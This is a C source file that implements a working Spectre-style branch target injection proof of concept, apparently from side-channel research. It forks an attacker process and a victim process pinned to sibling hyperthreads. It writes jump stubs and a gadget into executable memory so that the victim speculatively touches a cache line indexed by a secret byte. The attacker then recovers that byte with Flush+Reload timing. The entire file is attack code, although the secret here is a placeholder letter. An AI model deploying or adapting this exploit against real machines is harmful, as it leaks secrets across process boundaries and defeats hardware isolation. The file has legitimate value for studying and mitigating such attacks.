#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <assert.h>
#include <signal.h>

#include "./cacheutils.h"
#include "./smc_utils.h"

#define CACHE_LINE_SIZE 64
#define PAGE_SIZE 4096ULL
#define PAGE_BASE(addr)   ((addr) & ~(PAGE_SIZE-1))
#define PAGE_OFFSET(addr) ((addr) &  (PAGE_SIZE-1))

#define MY_MMAP(addr) mmap((void*)PAGE_BASE(addr), PAGE_SIZE, \
      PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0)

#define ARRAY_OFF (PAGE_SIZE)
#define ARRAY_OFFSET(i) ((i)*ARRAY_OFF + (char*)useless_array)
#define CACHE_TARGET_ARRAY_SIZE (2 * ARRAY_OFF * 256)

#define SECRET 'S'

char *asm_slow_jmp =  "mov $%zd, %%rax\n\t"
                      "mov $%zd, %%rbx\n\t"
                      "mov %%rax, 0x0000(%%rbx)\n\t"
                      "mov %%rax, 0x1000(%%rbx)\n\t"
                      "mov %%rax, 0x2000(%%rbx)\n\t"
                      "mov %%rax, 0x3000(%%rbx)\n\t"
                      "clflush 0x0000(%%rbx)\n\t"
                      "clflush 0x1000(%%rbx)\n\t"
                      "clflush 0x2000(%%rbx)\n\t"
                      "clflush 0x3000(%%rbx)\n\t"
                      "xor %%rax, %%rax\n\t"
                      "mov 0x0000(%%rbx), %%rax\n\t"
                      "or  0x1000(%%rbx), %%rax\n\t"
                      "or  0x2000(%%rbx), %%rax\n\t"
                      "or  0x3000(%%rbx), %%rax\n\t"
                      "jmp *%%rax\n";
char *asm_jmp = "ret\n";
char *asm_gadget = "mov $%zd, %%rax\n\t"
                    "xor %%rbx,%%rbx\n\t"
                    "mov $%zd, %%rdx\n\t"
                    "mov (%%rdx), %%bl\n\t"
                    //"mov %%rbx, %%rdx\n\t"    //better cache usage?
                    //"shl $6, %%rdx\n\t"       //better cache usage?
                    "shl $12, %%rbx\n\t"
                    //"add %%rdx, %%rax\n\t"    //better cache usage?
                    "add %%rbx, %%rax\n\t"
                    "mov 0(%%rax), %%rax\n\t"
                    "ret\n";

void *useless_array;

size_t calibration() {
  size_t touch_miss_min = ~0;
  size_t touch_miss = 0;
  size_t touch_hit  = 0;
  size_t timing = 0;

  const int measurements = 1024*1024;

  uint8_t stack_space_array[1024 * 1024 * 2];
  void *addr = stack_space_array + 1024*1024;

  for (int i=0; i<measurements; i++) {
    maccess(addr);
    timing = MEASURE({maccess(addr);});
    touch_hit += timing;
    sched_yield();
  }
  for (int i=0; i<measurements; i++) {
    flush(addr);
    timing = MEASURE({maccess(addr);});
    touch_miss += timing;
    touch_miss_min = touch_miss_min < timing ? touch_miss_min : timing;
    flush(addr);
    sched_yield();
  }
  touch_miss /= measurements;
  touch_hit  /= measurements;
  size_t threshold = (touch_hit + touch_miss_min) / 2;

  printf("hit %zd miss %zd (min %zd) thresh %zd\n", touch_hit, touch_miss, touch_miss_min, threshold);

  return threshold;
}

int main(int argc, char **argv) {
 if(argc < 3) {
    printf("usage: spectreV1 cpu_id_a cpu_id_b [oop]\n");
    printf("  cpu_id_<x>:   cpu ids of logical cpus sharing one core\n");
    printf("  oop:          if given the exploit will be oop\n");
    exit(1);
  }

  int secret = SECRET;

  int oop = argc==4 ? 1 : 0;

  printf("This PoC is super noisy and will take some time, but once it starts it comes in bursts.\n");
  printf("Secret letter is %c\n",secret);
  printf("Attack is%s out-of-place\n", oop ? "" : " not");

  size_t threshold = calibration();
  void * cache_addr;
  size_t attacker;

  void *slow_jump_buffer = mmap(NULL, 4*PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

  useless_array = mmap(NULL, CACHE_TARGET_ARRAY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memset(useless_array, 1, CACHE_TARGET_ARRAY_SIZE);

  cache_addr = ARRAY_OFFSET(0);

  size_t jump = 0x100+(size_t)mmap(NULL, 2*PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  size_t gadget = 0x10+(size_t)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  size_t target = 0x00+(size_t)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  inject_f_asm(jump, asm_slow_jmp, gadget, slow_jump_buffer);
  inject_f_asm(gadget, asm_jmp);

  pid_t pid = fork();
  assert(pid != -1);
  attacker = pid == 0;

  if (!attacker) {
    if (oop)
      jump += PAGE_SIZE;
    inject_f_asm(jump, asm_slow_jmp, target, slow_jump_buffer);
    inject_f_asm(gadget, asm_gadget, cache_addr, &secret);
    inject_f_asm(target, asm_jmp);
  }

  assert(useless_array != (void*)(-1));
  
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  int cpu_id = atoi(argv[pid ? 1 : 2]);
  CPU_SET(cpu_id, &cpu_set);
  assert(0 == sched_setaffinity(0, sizeof(cpu_set), &cpu_set));

  flush(cache_addr);

  if (attacker) {
    printf("attacker setup done\n");
    size_t trys  = 0;
    size_t hits  = 0; 
    size_t sucs = 0;
    while (1) {
      if (trys % 100000 == 0) {
        printf("\ntrys: %20zd\n", trys);
        printf("hits: %20zd\n", hits);
        printf("sucs: %20zd\n", sucs);
        printf("stat: %s\n", sucs * 10 > hits ? ":)" : ":(");
      }
      trys++;
      for (int i = 0; i < 100; i++)
        call_addr(jump);

      for (int i = 0; i<256; i++) {
        if (MEASURE({maccess(ARRAY_OFFSET(i));}) < threshold) {
          hits++;
          if ('A'<=i && i <='Z')
            printf("%c ",i);
          if (i == secret) {
            sucs++;
          }
        }
      }
      for (int i = 0; i<257; i++)
        flush(ARRAY_OFFSET(i));
    }
  }
  else {
    printf("victim setup done\n");
    while (1) {
      maccess(&secret);
      call_addr(jump);
    }
  }
  
  kill(pid ? pid : getppid(), SIGKILL);

  return 0;
}
